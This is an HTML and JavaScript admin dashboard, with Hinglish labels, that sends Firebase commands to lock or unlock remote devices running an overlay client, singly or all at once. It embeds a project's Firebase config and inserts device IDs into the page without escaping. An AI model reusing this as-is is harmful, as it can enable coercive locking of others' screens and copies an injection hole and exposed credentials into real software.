<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Remote Control Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">

<style>
  :root {
    --bg:       #080c10;
    --panel:    #0d1117;
    --border:   #1a2a1a;
    --green:    #00ff88;
    --green2:   #00cc66;
    --red:      #ff3355;
    --yellow:   #ffcc00;
    --dim:      #334433;
    --text:     #c8ffd4;
    --muted:    #4a6650;
    --glow:     0 0 12px #00ff8866;
  }

  * { margin:0; padding:0; box-sizing:border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* scanline overlay */
  body::before {
    content:'';
    position:fixed; inset:0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,255,100,0.015) 2px,
      rgba(0,255,100,0.015) 4px
    );
    pointer-events:none;
    z-index:9999;
  }

  /* grid bg */
  body::after {
    content:'';
    position:fixed; inset:0;
    background-image:
      linear-gradient(rgba(0,255,100,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,255,100,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events:none;
    z-index:0;
  }

  .wrap { position:relative; z-index:1; max-width:1000px; margin:0 auto; padding:24px 20px; }

  /* ── HEADER ── */
  header {
    display:flex; align-items:center; justify-content:space-between;
    border-bottom: 1px solid var(--border);
    padding-bottom:16px; margin-bottom:28px;
  }
  .logo {
    font-family:'Share Tech Mono', monospace;
    font-size:1.1rem; color:var(--green);
    letter-spacing:3px; text-transform:uppercase;
  }
  .logo span { color:var(--muted); }
  .conn-badge {
    display:flex; align-items:center; gap:8px;
    font-family:'Share Tech Mono', monospace;
    font-size:.75rem; color:var(--muted);
    background:#0a160a; border:1px solid var(--dim);
    padding:6px 14px; border-radius:2px;
  }
  .conn-badge .dot {
    width:8px; height:8px; border-radius:50%;
    background:var(--muted); transition:.3s;
  }
  .conn-badge.live .dot {
    background:var(--green);
    box-shadow: var(--glow);
    animation: pulse 1.4s infinite;
  }
  .conn-badge.live { color:var(--green); border-color:var(--dim); }

  @keyframes pulse {
    0%,100%{ opacity:1; } 50%{ opacity:.4; }
  }

  /* ── STATS ROW ── */
  .stats {
    display:grid; grid-template-columns:repeat(3,1fr);
    gap:12px; margin-bottom:28px;
  }
  .stat-box {
    background:var(--panel);
    border:1px solid var(--border);
    padding:16px 20px; border-radius:3px;
    position:relative; overflow:hidden;
  }
  .stat-box::before {
    content:''; position:absolute;
    top:0; left:0; right:0; height:2px;
    background: linear-gradient(90deg, var(--green), transparent);
  }
  .stat-label {
    font-size:.7rem; letter-spacing:2px;
    text-transform:uppercase; color:var(--muted);
    margin-bottom:6px;
  }
  .stat-val {
    font-family:'Share Tech Mono', monospace;
    font-size:2rem; color:var(--green);
    text-shadow: var(--glow);
  }

  /* ── BROADCAST BAR ── */
  .broadcast {
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:3px;
    padding:20px; margin-bottom:28px;
  }
  .section-label {
    font-size:.7rem; letter-spacing:3px;
    text-transform:uppercase; color:var(--muted);
    margin-bottom:14px;
  }
  .bcast-row {
    display:grid; grid-template-columns:1fr 1fr auto auto;
    gap:10px; align-items:center;
  }
  input, select {
    background:#060e08;
    border:1px solid var(--dim);
    color:var(--text);
    font-family:'Rajdhani', sans-serif;
    font-size:1rem;
    padding:10px 14px;
    border-radius:2px;
    outline:none;
    transition: border-color .2s;
  }
  input:focus, select:focus { border-color:var(--green); }
  input::placeholder { color:var(--muted); }
  select option { background:#0d1117; }

  /* ── BUTTONS ── */
  .btn {
    font-family:'Rajdhani', sans-serif;
    font-weight:700; font-size:.85rem;
    letter-spacing:2px; text-transform:uppercase;
    padding:10px 20px; border-radius:2px;
    border:none; cursor:pointer;
    transition: all .15s;
    white-space:nowrap;
  }
  .btn-lock {
    background: transparent;
    border:1px solid var(--red);
    color:var(--red);
  }
  .btn-lock:hover {
    background:var(--red);
    color:#000;
    box-shadow: 0 0 16px #ff335566;
  }
  .btn-unlock {
    background: transparent;
    border:1px solid var(--green);
    color:var(--green);
  }
  .btn-unlock:hover {
    background:var(--green);
    color:#000;
    box-shadow: var(--glow);
  }
  .btn-all-lock {
    background:var(--red);
    color:#fff; border:1px solid var(--red);
  }
  .btn-all-lock:hover {
    background:#cc0022; box-shadow: 0 0 20px #ff335588;
  }
  .btn-all-unlock {
    background:var(--green2);
    color:#000; border:1px solid var(--green2);
  }
  .btn-all-unlock:hover {
    background:var(--green);
  }

  /* ── ALL DEVICES ROW ── */
  .all-row {
    display:flex; gap:12px; align-items:center;
    margin-bottom:28px;
    padding:16px 20px;
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:3px;
  }
  .all-row span {
    flex:1;
    font-size:.75rem; letter-spacing:2px;
    text-transform:uppercase; color:var(--muted);
  }

  /* ── DEVICE TABLE ── */
  .device-section {
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:3px;
    overflow:hidden; margin-bottom:28px;
  }
  .device-header {
    display:grid;
    grid-template-columns:180px 100px 110px 1fr 120px 120px;
    gap:12px;
    padding:12px 20px;
    background:#060e08;
    border-bottom:1px solid var(--border);
    font-size:.65rem; letter-spacing:2px;
    text-transform:uppercase; color:var(--muted);
  }
  .device-row {
    display:grid;
    grid-template-columns:180px 100px 110px 1fr 120px 120px;
    gap:12px;
    padding:14px 20px;
    border-bottom:1px solid #0f1a0f;
    align-items:center;
    transition: background .15s;
    animation: rowIn .3s ease both;
  }
  @keyframes rowIn {
    from { opacity:0; transform:translateX(-8px); }
    to   { opacity:1; transform:translateX(0); }
  }
  .device-row:hover { background:#0a160a; }
  .device-row:last-child { border-bottom:none; }

  .dev-id {
    font-family:'Share Tech Mono', monospace;
    font-size:.85rem; color:var(--green);
  }
  .status-badge {
    display:inline-flex; align-items:center; gap:5px;
    font-size:.7rem; letter-spacing:1px;
    text-transform:uppercase;
    padding:3px 10px; border-radius:2px;
  }
  .status-badge.online {
    background:#001a0a; color:var(--green);
    border:1px solid var(--dim);
  }
  .status-badge.offline {
    background:#150005; color:#662233;
    border:1px solid #2a0015;
  }
  .lock-badge {
    font-family:'Share Tech Mono', monospace;
    font-size:.75rem; padding:3px 10px;
    border-radius:2px;
  }
  .lock-badge.locked {
    background:#200005; color:var(--red);
    border:1px solid #440011;
  }
  .lock-badge.unlocked {
    background:#001a0a; color:var(--green2);
    border:1px solid var(--dim);
  }
  .dev-seen {
    font-family:'Share Tech Mono', monospace;
    font-size:.7rem; color:var(--muted);
  }
  .empty-state {
    text-align:center;
    padding:48px;
    color:var(--muted);
    font-family:'Share Tech Mono', monospace;
    font-size:.85rem;
    letter-spacing:2px;
  }
  .empty-state .blink {
    animation: blink 1s step-end infinite;
  }
  @keyframes blink { 50%{ opacity:0; } }

  /* ── LOG ── */
  .log-section {
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:3px;
    overflow:hidden;
  }
  .log-header {
    padding:12px 20px;
    background:#060e08;
    border-bottom:1px solid var(--border);
    display:flex; align-items:center; justify-content:space-between;
  }
  #log-box {
    height:180px;
    overflow-y:auto;
    padding:12px 20px;
    font-family:'Share Tech Mono', monospace;
    font-size:.75rem;
    line-height:1.8;
  }
  #log-box::-webkit-scrollbar { width:4px; }
  #log-box::-webkit-scrollbar-track { background:transparent; }
  #log-box::-webkit-scrollbar-thumb { background:var(--dim); }
  .log-entry { display:flex; gap:12px; }
  .log-time { color:var(--muted); min-width:80px; }
  .log-msg.ok  { color:var(--green); }
  .log-msg.err { color:var(--red); }
  .log-msg.inf { color:var(--yellow); }

  /* ── TOAST ── */
  #toast {
    position:fixed; bottom:24px; right:24px;
    background:var(--panel);
    border:1px solid var(--green);
    color:var(--green);
    font-family:'Share Tech Mono', monospace;
    font-size:.8rem; letter-spacing:1px;
    padding:12px 20px; border-radius:3px;
    transform:translateY(20px); opacity:0;
    transition: all .3s;
    z-index:1000;
    box-shadow: var(--glow);
  }
  #toast.show { opacity:1; transform:translateY(0); }
  #toast.err  { border-color:var(--red); color:var(--red); }

  @media(max-width:700px){
    .stats { grid-template-columns:1fr 1fr; }
    .bcast-row { grid-template-columns:1fr 1fr; }
    .device-header,
    .device-row { grid-template-columns:1fr 80px 90px; }
    .device-header > *:nth-child(n+4),
    .device-row   > *:nth-child(n+4) { display:none; }
  }
</style>
</head>
<body>
<div class="wrap">

  <!-- HEADER -->
  <header>
    <div class="logo">RCP<span>//</span>Remote Control Panel</div>
    <div class="conn-badge" id="conn-badge">
      <div class="dot"></div>
      <span id="conn-text">CONNECTING...</span>
    </div>
  </header>

  <!-- STATS -->
  <div class="stats">
    <div class="stat-box">
      <div class="stat-label">Total Devices</div>
      <div class="stat-val" id="s-total">0</div>
    </div>
    <div class="stat-box">
      <div class="stat-label">Online</div>
      <div class="stat-val" id="s-online" style="color:var(--green)">0</div>
    </div>
    <div class="stat-box">
      <div class="stat-label">Locked</div>
      <div class="stat-val" id="s-locked" style="color:var(--red)">0</div>
    </div>
  </div>

  <!-- BROADCAST -->
  <div class="broadcast">
    <div class="section-label">// Ek Device ko Command Bhejo</div>
    <div class="bcast-row">
      <input id="b-device" placeholder="Device ID (e.g. device_001)" />
      <input id="b-msg"    placeholder="Lock message (optional)" />
      <button class="btn btn-lock"   onclick="sendLock()">🔒 Lock</button>
      <button class="btn btn-unlock" onclick="sendUnlock()">🔓 Unlock</button>
    </div>
  </div>

  <!-- ALL DEVICES -->
  <div class="all-row">
    <span>// Saare Devices ek saath</span>
    <button class="btn btn-all-lock"   onclick="lockAll()">🔒 LOCK ALL</button>
    <button class="btn btn-all-unlock" onclick="unlockAll()">🔓 UNLOCK ALL</button>
  </div>

  <!-- DEVICE TABLE -->
  <div class="device-section">
    <div class="device-header">
      <div>Device ID</div>
      <div>Status</div>
      <div>Screen</div>
      <div>Last Seen</div>
      <div>Lock</div>
      <div>Unlock</div>
    </div>
    <div id="device-list">
      <div class="empty-state">
        <span class="blink">█</span> Devices dhundh raha hoon...
      </div>
    </div>
  </div>

  <!-- LOG -->
  <div class="log-section">
    <div class="log-header">
      <div class="section-label" style="margin:0">// Activity Log</div>
      <button class="btn btn-unlock" style="padding:4px 12px;font-size:.7rem"
              onclick="clearLog()">CLEAR</button>
    </div>
    <div id="log-box"></div>
  </div>

</div>

<!-- TOAST -->
<div id="toast"></div>

<!-- FIREBASE SDK -->
<script type="module">
import { initializeApp }           from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, set, onValue, get }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

// ─── CONFIG ───────────────────────────────────────
const firebaseConfig = {
  apiKey:            "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
  authDomain:        "smsyy-f7bb7.firebaseapp.com",
  databaseURL:       "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
  projectId:         "smsyy-f7bb7",
  storageBucket:     "smsyy-f7bb7.firebasestorage.app",
  messagingSenderId: "199149027655",
  appId:             "1:199149027655:web:2d9e70e7dff7abc293cc62"
};
// ──────────────────────────────────────────────────

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// ─── CONNECTION STATUS ─────────────────────────────
const connRef = ref(database, ".info/connected");
onValue(connRef, snap => {
  const live = snap.val();
  const badge = document.getElementById("conn-badge");
  const txt   = document.getElementById("conn-text");
  if (live) {
    badge.classList.add("live");
    txt.textContent = "FIREBASE LIVE";
    addLog("Firebase se connect ho gaya", "ok");
  } else {
    badge.classList.remove("live");
    txt.textContent = "DISCONNECTED";
    addLog("Firebase connection toot gayi", "err");
  }
});

// ─── DEVICES LIVE WATCH ───────────────────────────
const devicesRef = ref(database, "devices");
onValue(devicesRef, snap => {
  const data = snap.val() || {};
  renderDevices(data);
  updateStats(data);
});

function renderDevices(data) {
  const list = document.getElementById("device-list");
  const keys = Object.keys(data);

  if (keys.length === 0) {
    list.innerHTML = `<div class="empty-state">
      <span class="blink">█</span> Koi device nahi mila. overlay_client.py chalao.
    </div>`;
    return;
  }

  list.innerHTML = keys.map(id => {
    const d      = data[id];
    const online = d.status === "online";
    const locked = d.overlay_active === true;
    const seen   = d.last_seen ? d.last_seen.replace("T"," ").slice(0,19) : "—";
    return `
    <div class="device-row">
      <div class="dev-id">${id}</div>
      <div>
        <span class="status-badge ${online?'online':'offline'}">
          ${online?"● ONLINE":"○ OFFLINE"}
        </span>
      </div>
      <div>
        <span class="lock-badge ${locked?'locked':'unlocked'}">
          ${locked?"🔒 LOCKED":"🔓 OPEN"}
        </span>
      </div>
      <div class="dev-seen">${seen}</div>
      <div>
        <button class="btn btn-lock" style="padding:6px 14px"
          onclick="window._lock('${id}')">Lock</button>
      </div>
      <div>
        <button class="btn btn-unlock" style="padding:6px 14px"
          onclick="window._unlock('${id}')">Unlock</button>
      </div>
    </div>`;
  }).join("");
}

function updateStats(data) {
  const keys   = Object.keys(data);
  const online = keys.filter(k => data[k].status === "online").length;
  const locked = keys.filter(k => data[k].overlay_active).length;
  document.getElementById("s-total").textContent  = keys.length;
  document.getElementById("s-online").textContent = online;
  document.getElementById("s-locked").textContent = locked;
}

// ─── SEND COMMAND ─────────────────────────────────
function sendCommand(deviceId, action, message="🔒 Screen Locked", subMsg="Administrator ne lock kiya") {
  const cmdRef = ref(database, `commands/${deviceId}`);
  set(cmdRef, {
    action,
    message,
    sub_message: subMsg,
    color: action === "lock" ? "#ff4444" : "#00ff88",
    timestamp: new Date().toISOString(),
    sent_by: "admin_web"
  }).then(() => {
    addLog(`Command '${action}' → ${deviceId}`, "ok");
    toast(`${action.toUpperCase()} → ${deviceId}`, action === "unlock");
  }).catch(e => {
    addLog(`Error: ${e.message}`, "err");
    toast("Error! " + e.message, false, true);
  });
}

// ─── EXPORTED FUNCTIONS ───────────────────────────
window._lock   = id => sendCommand(id, "lock");
window._unlock = id => sendCommand(id, "unlock");

window.sendLock = () => {
  const id  = document.getElementById("b-device").value.trim();
  const msg = document.getElementById("b-msg").value.trim();
  if (!id) { toast("Device ID daalo!", false, true); return; }
  sendCommand(id, "lock", msg || "🔒 Screen Locked");
};

window.sendUnlock = () => {
  const id = document.getElementById("b-device").value.trim();
  if (!id) { toast("Device ID daalo!", false, true); return; }
  sendCommand(id, "unlock");
};

window.lockAll = async () => {
  const snap = await get(devicesRef);
  const data = snap.val() || {};
  const keys = Object.keys(data);
  if (keys.length === 0) { toast("Koi device nahi!", false, true); return; }
  keys.forEach(id => sendCommand(id, "lock"));
  addLog(`LOCK ALL — ${keys.length} devices`, "inf");
};

window.unlockAll = async () => {
  const snap = await get(devicesRef);
  const data = snap.val() || {};
  const keys = Object.keys(data);
  if (keys.length === 0) { toast("Koi device nahi!", false, true); return; }
  keys.forEach(id => sendCommand(id, "unlock"));
  addLog(`UNLOCK ALL — ${keys.length} devices`, "inf");
};

// ─── LOG ──────────────────────────────────────────
function addLog(msg, type="inf") {
  const box  = document.getElementById("log-box");
  const time = new Date().toLocaleTimeString("en-IN", {hour12:false});
  const el   = document.createElement("div");
  el.className = "log-entry";
  el.innerHTML = `<span class="log-time">${time}</span>
                  <span class="log-msg ${type}">${msg}</span>`;
  box.prepend(el);
  if (box.children.length > 60) box.lastChild.remove();
}

window.clearLog = () => {
  document.getElementById("log-box").innerHTML = "";
};

// ─── TOAST ────────────────────────────────────────
function toast(msg, good=true, err=false) {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.className   = "show" + (err ? " err" : "");
  clearTimeout(window._toastT);
  window._toastT = setTimeout(() => el.classList.remove("show"), 2800);
}

addLog("Admin panel load hua", "inf");
</script>
</body>
</html>
